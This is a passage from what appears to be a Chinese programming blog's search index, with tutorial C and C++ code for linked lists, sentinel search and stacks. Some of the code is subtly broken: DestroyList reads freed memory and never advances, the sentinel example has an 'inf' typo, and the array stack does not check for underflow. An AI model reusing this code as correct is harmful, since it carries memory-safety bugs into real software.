n - 1; i &gt;= 0; --i) { int index = c[a[i]]-1; r[index] = a[i]; c[a[i]]--; } // &#x5C06;&#x7ED3;&#x679C;&#x62F7;&#x8D1D;&#x7ED9; a &#x6570;&#x7EC4; for (int i = 0; i &lt; n; ++i) { a[i] = r[i]; }} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linked List]]></title>
    <url>%2F2018%2F10%2F25%2FLinked-List%2F</url>
    <content type="text"><![CDATA[LinkList.h123456789101112131415161718192021222324#ifndef LINKLIST_H#define LINKLIST_H#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;typedef char ElemType;typedef struct LNode { ElemType data; struct LNode*next;}LinkList;void CreateListHead(LinkList *&amp;L,ElemType a[],int n);void CreateListTail(LinkList *&amp;L,ElemType a[],int n);void InitList(LinkList *&amp;L);void DestroyList(LinkList *&amp;L);bool ListEmpty(LinkList *L);int ListLength(LinkList *L);void ShowList(LinkList *L);bool GetListElem(LinkList *L,int i,ElemType &amp;e);int LocateElem(LinkList*L,ElemType e);bool ListInsert(LinkList *&amp;L,int i,ElemType e);bool ListDelete(LinkList *&amp;L,int i,ElemType &amp;e);#endif LinkList.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#include &quot;LinkList.h&quot;void CreateListHead(LinkList *&amp;L,ElemType a[],int n){ int i; LinkList *s; L = (LinkList *)malloc(sizeof(LinkList)); L-&gt;next = NULL; for(i = 0;i &lt; n;i++) { s=(LinkList*)malloc(sizeof(LinkList)); s-&gt;data = a[i]; s-&gt;next = L-&gt;next; L-&gt;next = s; }}void CreateListTail(LinkList *&amp;L,ElemType a[],int n){ int i; LinkList * s,* r; L = (LinkList *)malloc(sizeof(LinkList)); r = L; for(i = 0;i &lt; n;i++) { s = (LinkList *)malloc(sizeof(LinkList)); s-&gt;data = a[i]; r-&gt;next = s; r = s; } r-&gt;next = NULL; }void InitList(LinkList *&amp;L){ L=(LinkList *)malloc(sizeof(LinkList)); L-&gt;next = NULL;}void DestroyList(LinkList *&amp;L){ LinkList * pre = L,*p = L-&gt;next; while(p!=NULL) { free(pre); pre = p; p = L-&gt;next; } free(pre);}bool ListEmpty(LinkList *L){ return(L-&gt;next==NULL); }int ListLength(LinkList *L){ int n = 0; LinkList * p = L; while(p-&gt;next!=NULL) { n++; p=p-&gt;next; } return(n);}void ShowList(LinkList *L){ LinkList * p = L-&gt;next;//&#xD6;&#xB8;&#xCF;&#xF2;&#xBF;&#xAA;&#xCA;&#xBC;&#xBD;&#xDA;&#xB5;&#xE3; while(p!=NULL) { printf(&quot; %c &quot;,p-&gt;data); p = p-&gt;next; } printf(&quot;\n&quot;);}bool GetListElem(LinkList *L,int i,ElemType &amp;e){ int j = 0; LinkList *p = L; while(j&lt;i&amp;&amp;p!=NULL) { j++; p=p-&gt;next; } if(p==NULL) return false; else { e=p-&gt;data; return true; }}int LocateElem(LinkList*L,ElemType e){ int i=1; LinkList *p = L-&gt;next; while(p!=NULL&amp;&amp;p-&gt;data!=e){ p=p-&gt;next; i++; } if(p==NULL) { return(0); } else return(i);}bool ListInsert(LinkList *&amp;L,int i,ElemType e){ int j=0; LinkList *p =L,*s; while(j&lt;i-1&amp;&amp;p!=NULL) { j++; p=p-&gt;next; } if(p==NULL) { return false; } else { s= (LinkList*)malloc(sizeof(LinkList)); s-&gt;data = e; s-&gt;next = p-&gt;next; p-&gt;next = s; return true; }}bool ListDelete(LinkList *&amp;L,int i,ElemType &amp;e){ int j=0; LinkList * p =L,*q; while(j&lt;i-1&amp;&amp;p!=NULL) { j++; p=p-&gt;next; } if(p==NULL) return false; else { q=p-&gt;next; if(q==NULL) return false; e=q-&gt;data; p-&gt;next=q-&gt;next; free(q); return true; }} &#x54E8;&#x5175;&#x94FE;&#x8868;&#x4E2D;&#x7684;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x662F;&#x89E3;&#x51B3;&#x8FB9;&#x754C;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x4E0D;&#x53C2;&#x4E0E;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5F15;&#x5165;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#xFF0C;&#x5219;&#x4E0D;&#x7BA1;&#x94FE;&#x8868;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;head&#x6307;&#x9488;&#x90FD;&#x4F1A;&#x6307;&#x5411;&#x8FD9;&#x4E2A;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x3002;&#x6211;&#x4EEC;&#x628A;&#x8FD9;&#x79CD;&#x6709;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868;&#x79F0;&#x4E3A;&#x5E26;&#x5934;&#x94FE;&#x8868;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;&#x6CA1;&#x6709;&#x201C;&#x54E8;&#x5175;&#x201D;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868;&#x5C31;&#x79F0;&#x4E3A;&#x4E0D;&#x5E26;&#x5934;&#x94FE;&#x8868;&#x3002; &#x4E3E;&#x4E2A;&#x6817;&#x5B50;:code1:&#x672A;&#x5229;&#x7528;&#x54E8;&#x5175;12345678910111213141516171819// &#x5728;&#x6570;&#x7EC4; a &#x4E2D;&#xFF0C;&#x67E5;&#x627E; key&#xFF0C;&#x8FD4;&#x56DE; key &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;// &#x5176;&#x4E2D;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4; a &#x7684;&#x957F;&#x5EA6;int find(char* a, int n, char key) { // &#x8FB9;&#x754C;&#x6761;&#x4EF6;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C; a &#x4E3A;&#x7A7A;&#xFF0C;&#x6216;&#x8005; n&lt;=0&#xFF0C;&#x8BF4;&#x660E;&#x6570;&#x7EC4;&#x4E2D;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x4E0D;&#x7528; while &#x5FAA;&#x73AF;&#x6BD4;&#x8F83;&#x4E86; if(a == null || n &lt;= 0) { return -1; } int i = 0; // &#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#xFF1A;i&lt;n &#x548C; a[i]==key. while (i &lt; n) { if (a[i] == key) { return i; } ++i; } return -1;} code2:&#x5229;&#x7528;&#x54E8;&#x5175;1234567891011121314151617181920212223242526272829303132333435363738// &#x5728;&#x6570;&#x7EC4; a &#x4E2D;&#xFF0C;&#x67E5;&#x627E; key&#xFF0C;&#x8FD4;&#x56DE; key &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;// &#x5176;&#x4E2D;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4; a &#x7684;&#x957F;&#x5EA6;// &#x6211;&#x4E3E; 2 &#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x62FF;&#x4F8B;&#x5B50;&#x8D70;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;// a = {4, 2, 3, 5, 9, 6} n=6 key = 7// a = {4, 2, 3, 5, 9, 6} n=6 key = 6inf find(char* a, int n, char key) { if(a == null || n &lt;= 0) { return -1; } // &#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x8981;&#x5C06; a[n-1] &#x7684;&#x503C;&#x66FF;&#x6362;&#x6210; key&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7279;&#x6B8A;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x503C; if (a[n-1] == key) { return n-1; } // &#x628A; a[n-1] &#x7684;&#x503C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x53D8;&#x91CF; tmp &#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E4B;&#x540E;&#x6062;&#x590D;&#x3002;tmp=6&#x3002; // &#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x76EE;&#x7684;&#x662F;&#xFF1A;&#x5E0C;&#x671B; find() &#x4EE3;&#x7801;&#x4E0D;&#x8981;&#x6539;&#x53D8; a &#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5185;&#x5BB9; char tmp = a[n-1]; // &#x628A; key &#x7684;&#x503C;&#x653E;&#x5230; a[n-1] &#x4E2D;&#xFF0C;&#x6B64;&#x65F6; a = {4, 2, 3, 5, 9, 7} a[n-1] = key; int i = 0; // while &#x5FAA;&#x73AF;&#x6BD4;&#x8D77;&#x4EE3;&#x7801;&#x4E00;&#xFF0C;&#x5C11;&#x4E86; i&lt;n &#x8FD9;&#x4E2A;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C; while (a[i] != key) { ++i; } // &#x6062;&#x590D; a[n-1] &#x539F;&#x6765;&#x7684;&#x503C;, &#x6B64;&#x65F6; a= {4, 2, 3, 5, 9, 6} a[n-1] = tmp; if (i == n-1) { // &#x5982;&#x679C; i == n-1 &#x8BF4;&#x660E;&#xFF0C;&#x5728; 0...n-2 &#x4E4B;&#x95F4;&#x90FD;&#x6CA1;&#x6709; key&#xFF0C;&#x6240;&#x4EE5;&#x8FD4;&#x56DE; -1 return -1; } else { // &#x5426;&#x5219;&#xFF0C;&#x8FD4;&#x56DE; i&#xFF0C;&#x5C31;&#x662F;&#x7B49;&#x4E8E; key &#x503C;&#x7684;&#x5143;&#x7D20;&#x7684;&#x4E0B;&#x6807; return i; }} tips&#xFF1A;&#x4F7F;&#x7528;&#x54E8;&#x5175;&#x7684;&#x601D;&#x60F3;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Stack]]></title>
    <url>%2F2018%2F10%2F25%2FStack%2F</url>
    <content type="text"><![CDATA[&#x601D;&#x7EF4;&#x5BFC;&#x56FE;&#xFF1A; &#x94FE;&#x5F0F;&#x6808; StackBasedOnLinkedList.h1234567891011121314151617181920// &#x7C7B;&#x6A21;&#x677F;&#x7684;&#x58F0;&#x660E;&#xFF0C;&#x5173;&#x952E;&#x5B57; class &#x4E5F;&#x53EF;&#x4EE5;&#x66F4;&#x6362;&#x6210; typenametemplate&lt;class T&gt; class LinkedListStack{public: LinkedListStack(); ~LinkedListStack(); void push(const T &amp; data); //&#x5165;&#x6808; T peek(); //&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x5373;&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20; T pop(); //&#x51FA;&#x6808;&#xFF0C;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20; int size() const; //&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;private: int count; //&#x5B58;&#x653E;&#x6808;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;&#x5355;&#x94FE;&#x8868;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4E0D;&#x89C4;&#x5B9A;&#x6808;&#x7684;&#x6700;&#x5927;&#x53EF;&#x627F;&#x8F7D;&#x91CF; struct LinkedNode { T data; LinkedNode * next; }; LinkedNode * head; // &#x5355;&#x94FE;&#x8868;&#x7684;&#x5934;&#x6307;&#x9488;&#xFF0C;&#x4E0D;&#x5E26;&#x5934;&#x8282;&#x70B9;}; StackBasedOnLinkedList.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127/** * 1&#xFF09;&#x94FE;&#x5F0F;&#x6808;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&#x5165;&#x6808;&#xFF0C;&#x51FA;&#x6808;&#x4EE5;&#x53CA;&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;&#xFF1B; * 2&#xFF09;&#x91C7;&#x7528;&#x6A21;&#x677F;&#x7684;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x5B58;&#x50A8;&#x4EFB;&#x610F;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E; * 3&#xFF09;&#x91C7;&#x7528;&#x5355;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x6808; * 4&#xFF09;pop&#x548C;peek &#x51FA;&#x6808;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7A0D;&#x5FAE;&#x6709;&#x70B9;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x6808;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD4;&#x56DE;null&#xFF0C;cpp&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x662F;0&#x3002; * * &#x6539;&#x8FDB;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x4E0D;&#x7528;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x800C;&#x662F;&#x91C7;&#x7528;&#x53C2;&#x6570;&#x5217;&#x8868;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;&#xFF0C;&#x8FD9;&#x6837;&#x7A0D;&#x5FAE;&#x6709;&#x70B9;&#x9EBB;&#x70E6; * * &#x6216;&#x8005;&#x5C31;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#x5148;&#x8C03;&#x7528;size&#x51FD;&#x6570;&#x5224;&#x65AD;&#x4EE5;&#x4E0B; * Author&#xFF1A;caozx * time &#xFF1B;2018&#x5E74;10&#x6708;11&#x65E5; */#include &lt;iostream&gt;#include &quot;StackBasedOnLinkedList.h&quot;using namespace std;template&lt;class T&gt; LinkedListStack&lt;T&gt;::LinkedListStack(){ this -&gt; count = 0; this -&gt; head = new LinkedNode; this -&gt; head -&gt; next = NULL;}template&lt;class T&gt; LinkedListStack&lt;T&gt;::~LinkedListStack(){ LinkedNode * ptr, * temp; ptr = head; while(ptr -&gt; next != NULL){ temp = ptr -&gt; next; ptr -&gt; next = temp -&gt; next; delete temp; } delete head ; //&#x5220;&#x9664;&#x5934;&#x8282;&#x70B9; this -&gt; head = NULL; this -&gt; count = 0;}// &#x5165;&#x6808;template&lt;class T&gt; void LinkedListStack&lt;T&gt;::push(const T &amp; data){ LinkedNode * insertPtr = new LinkedNode; insertPtr -&gt; data = data; insertPtr -&gt; next = this -&gt; head -&gt; next; head -&gt; next = insertPtr; this -&gt; count ++; cout &lt;&lt; &quot;push data : &quot; &lt;&lt; this -&gt; head -&gt; next -&gt; data &lt;&lt; endl; }//&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x5373;&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;template&lt;class T&gt; T LinkedListStack&lt;T&gt;::peek(){ if(this -&gt; count == 0 || this -&gt; head -&gt; next == NULL){ cout &lt;&lt; &quot; stack is empty, peek fail&quot;&lt;&lt; endl; return NULL; } else{ return this -&gt; head -&gt; next -&gt; data; }}//&#x51FA;&#x6808;&#xFF0C;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;template&lt;class T&gt; T LinkedListStack&lt;T&gt;::pop(){ if(this -&gt; count == 0 || this -&gt; head -&gt; next == NULL){ cout &lt;&lt; &quot; stack is empty, pop fail&quot;&lt;&lt; endl; return NULL; } else{ LinkedNode * temp = this -&gt; head -&gt; next; this -&gt; head -&gt; next = temp -&gt; next; T data = temp -&gt; data; delete temp; this -&gt; count --; return data; }}//&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;template&lt;class T&gt; int LinkedListStack&lt;T&gt;::size() const{ return this -&gt; count;} int main(int argc, char const *argv[]){ cout &lt;&lt; &quot; === StackBasedOnLinkedList test begin ===&quot; &lt;&lt; endl; LinkedListStack &lt;float&gt; stack; cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; stack.push(10.1); stack.push(20.2); stack.push(30.); stack.push(40.4); stack.push(50.5); stack.push(60.6); cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; &quot;stack peek &quot; &lt;&lt; stack.peek() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack peek &quot; &lt;&lt; stack.peek() &lt;&lt; endl; stack.push(110.1); stack.push(120.2); stack.push(130.3); stack.push(140.4); stack.push(150.5); stack.push(160.6); cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; &quot;stack peek &quot; &lt;&lt; stack.peek() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack peek &quot; &lt;&lt; stack.peek() &lt;&lt; endl; //peek cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; &quot;size===&quot;&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; &quot;stack peek &quot; &lt;&lt; stack.peek() &lt;&lt; endl; //peek cout &lt;&lt; &quot;stack pop &quot; &lt;&lt; stack.pop() &lt;&lt; endl; system(&quot;pause&quot;); return 0;} &#x987A;&#x5E8F;&#x6808; StackBasedOnArray.h12345678910111213141516171819// &#x7C7B;&#x6A21;&#x677F;&#x7684;&#x58F0;&#x660E;(line 3)&#xFF0C;&#x7C7B;&#x6A21;&#x677F;&#x5B9E;&#x4F8B;&#x5316;&#x540E;&#x5C31;&#x662F;&#x6A21;&#x677F;&#x7C7B;// &#x7C7B;&#x6A21;&#x677F;&#x58F0;&#x660E;&#x7684;&#x5199;&#x6CD5; template &lt;class T&gt; class &#x7C7B;&#x540D;{}template &lt;class T&gt; class ArrayStack{public: ArrayStack(); ArrayStack(int count); ~ArrayStack(); void push(T data); //&#x5165;&#x6808; T pop(); //&#x51FA;&#x6808;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20; T peek(); //&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x6808;&#x9876;&#x6307;&#x9488;&#x4E0D;&#x53D8; int stackSize(); int stackMaxSize();private: int flag; //&#x6808;&#x9876;&#x6807;&#x7B7E;&#xFF0C;&#x6307;&#x5411;&#x6808;&#x9876; int count ; //&#x6808;&#x7684;&#x5BB9;&#x91CF; T *array; //&#x6307;&#x9488;}; StackBasedOnArray.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122/** * 1&#xFF09;&#x987A;&#x5E8F;&#x6808;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&#x5165;&#x6808;&#x548C;&#x51FA;&#x6808;&#xFF1B; * 2&#xFF09;&#x91C7;&#x7528;&#x6A21;&#x677F;&#x7684;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x5B58;&#x50A8;&#x4EFB;&#x610F;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E; * 3&#xFF09;&#x91C7;&#x7528;&#x6570;&#x7EC4;&#x7684;&#x6808;&#xFF0C;&#x652F;&#x6301;&#x52A8;&#x6001;&#x6269;&#x5BB9;&#xFF0C;&#x6BCF;&#x6B21;&#x6269;&#x5BB9;1.5 &#x500D;&#xFF0C;&#x521D;&#x59CB;&#x6808;&#x7684;&#x5927;&#x5C0F;&#x662F; 10 &#x3002; * * Author&#xFF1A;caozx * time &#xFF1B;2018&#x5E74;10&#x6708;11&#x65E5; */#include &lt;iostream&gt;#include &quot;StackBasedOnArray.h&quot;using namespace std;//&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x6808;//&#x7C7B;&#x6A21;&#x677F;&#x6210;&#x5458;&#x51FD;&#x6570;&#x7684;&#x5199;&#x6CD5; template&lt;class T&gt; &#x8FD4;&#x56DE;&#x503C;&#x7C7B;&#x578B; &#x7C7B;&#x540D;&lt;T&gt;::&#x6210;&#x5458;&#x51FD;&#x6570;&#x540D;(&#x53C2;&#x6570;&#x5217;&#x8868;){}template&lt;class T&gt; ArrayStack&lt;T&gt;::ArrayStack() { this -&gt; count = 10; this -&gt; flag = 0; this -&gt; array = new T[this -&gt; count]; if (! this -&gt; array){ cout &lt;&lt; &quot;array malloc memory failure&quot; &lt;&lt; endl; }}//&#x6709;&#x53C2;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x6808;template&lt;class T&gt; ArrayStack&lt;T&gt;::ArrayStack(int count) { this -&gt; count = count; this -&gt; flag = 0; this -&gt; array = new T[this -&gt; count]; if (! this -&gt; array){ cout &lt;&lt; &quot;array malloc memory failure&quot; &lt;&lt; endl; }}//&#x6790;&#x6784;&#x51FD;&#x6570;&#xFF0C;&#x9500;&#x6BC1;&#x6808;template &lt;class T&gt; ArrayStack&lt;T&gt;::~ArrayStack(){ this -&gt; count = 0; this -&gt; flag = 0; if(this -&gt; array){ delete [] this -&gt; array; this -&gt; array = NULL; } } // &#x5165;&#x6808;template&lt;class T&gt; void ArrayStack&lt;T&gt;::push(T data){ if(this -&gt; flag == this -&gt; count){ cout &lt;&lt; &quot;The stack is full , so need to enlarge 1.5x! &quot;&lt;&lt; endl; this -&gt; count = int (1.5 * this -&gt; count); T * temp = new T [this -&gt; count]; for(int i = 0; i &lt; this -&gt; flag ; i++){ temp[i] = this -&gt; array[i]; //cout &lt;&lt; temp[i] &lt;&lt;endl; } delete [] this -&gt; array; //&#x91CA;&#x653E;&#x539F;&#x6765;&#x7684;&#x7A7A;&#x95F4; temp[this -&gt; flag] = data; this -&gt; flag ++; this -&gt; array = temp; } else{ this -&gt; array [this -&gt; flag] = data; this -&gt; flag ++ ; }}//&#x51FA;&#x6808;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;template&lt;class T&gt; T ArrayStack&lt;T&gt;::pop(){ this -&gt; flag --; T temp = this -&gt; array[this -&gt; flag]; return temp;}//&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;template&lt;class T&gt; T ArrayStack&lt;T&gt;::peek(){ T temp = this -&gt; array[this -&gt; flag - 1]; return temp;}template&lt;class T&gt; int ArrayStack&lt;T&gt;::stackSize(){ return this -&gt; flag;}template&lt;class T&gt; int ArrayStack&lt;T&gt;::stackMaxSize(){ return this -&gt; count;}int main(int argc, char const *argv[]){ cout &lt;&lt; &quot; === test begin ===&quot; &lt;&lt; endl; ArrayStack &lt;int&gt; arrstack(12); arrstack.push(10); arrstack.push(20); arrstack.push(30); arrstack.push(40); arrstack.push(50); arrstack.push(60); arrstack.push(70); arrstack.push(80); arrstack.push(90); arrstack.push(100); arrstack.push(110); arrstack.push(120); arrstack.push(130); arrstack.push(140); arrstack.push(150); cout &lt;&lt; &quot;peek , not delete &quot; &lt;&lt; arrstack.peek() &lt;&lt; endl; cout &lt;&lt; &quot;pop , delete &quot; &lt;&lt; arrstack.pop()&lt;&lt;endl; arrstack.push(210); arrstack.push(220); cout &lt;&lt; &quot;peek , not delete &quot; &lt;&lt; arrstack.peek() &lt;&lt; endl; cout &lt;&lt; &quot;pop , delete &quot; &lt;&lt; arrstack.pop()&lt;&lt;endl; system(&quot;pause&quot;); return 0;} &#x601D;&#x8003; &#x51FD;&#x6570;&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x5D4C;&#x5957;&#xFF0C;&#x4F7F;&#x7528;&#x6808;&#x6765;&#x5B58;&#x50A8;&#x4E34;&#x65F6;&#x53D8;&#x91CF;&#xFF0C;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x91CC;&#x5C42;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5916;&#x5C42;&#x51FD;&#x6570;&#xFF08;&#x9010;&#x7EA7;&#x5411;&#x5916;&#xFF09;&#x7684;&#x9700;&#x6C42;&#x3002; &#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5806;&#x6808;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x662F;&#x771F;&#x5B9E;&#x5B58;&#x5728;&#x7684;&#x7269;&#x7406;&#x533A;&#xFF0C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x662F;&#x62BD;&#x8C61;&#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7ED3;&#x6784;&#x3002;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x5728;&#x903B;&#x8F91;&#x4E0A;&#x5206;&#x4E3A;&#x4E09;&#x90E8;&#x5206;&#xFF1A;&#x4EE3;&#x7801;&#x533A;&#x3001;&#x9759;&#x6001;&#x6570;&#x636E;&#x533A;&#x548C;&#x52A8;&#x6001;&#x6570;&#x636E;&#x533A;&#xFF0C;&#x52A8;&#x6001;&#x6570;&#x636E;&#x533A;&#x53C8;&#x5206;&#x4E3A;&#x6808;&#x533A;&#x548C;&#x5806;&#x533A;&#x3002;&#x4EE3;&#x7801;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x65B9;&#x6CD5;&#x4F53;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x3002;&#x9AD8;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF09;&#x3001;&#x4E2D;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x5185;&#x5B58;&#x8C03;&#x5EA6;&#xFF09;&#x3001;&#x4F4E;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x8FDB;&#x7A0B;&#x8C03;&#x5EA6;&#xFF09;&#x63A7;&#x5236;&#x4EE3;&#x7801;&#x533A;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x5207;&#x6362;&#x3002;&#x9759;&#x6001;&#x6570;&#x636E;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x3001;&#x9759;&#x6001;&#x53D8;&#x91CF;&#x3001;&#x5E38;&#x91CF;&#xFF0C;&#x5E38;&#x91CF;&#x5305;&#x62EC;final&#x4FEE;&#x9970;&#x7684;&#x5E38;&#x91CF;&#x548C;String&#x5E38;&#x91CF;&#x3002;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x548C;&#x56DE;&#x6536;&#x3002;&#x6808;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x8